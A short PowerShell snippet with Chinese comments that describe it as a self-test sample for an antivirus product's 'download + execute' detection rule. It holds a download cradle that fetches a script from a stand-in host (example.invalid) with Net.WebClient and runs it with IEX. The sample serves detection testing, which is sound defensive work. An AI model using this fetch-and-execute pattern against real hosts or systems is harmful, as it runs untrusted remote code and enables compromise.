# 满唯杀毒 自检样本：验证“下载 + 执行”行为组合规则。
# 下面的地址不可解析，样本不会真的联网，仅用于触发本地规则。
$payload = (New-Object Net.WebClient).DownloadString('http://example.invalid/selftest.ps1')
IEX $payload
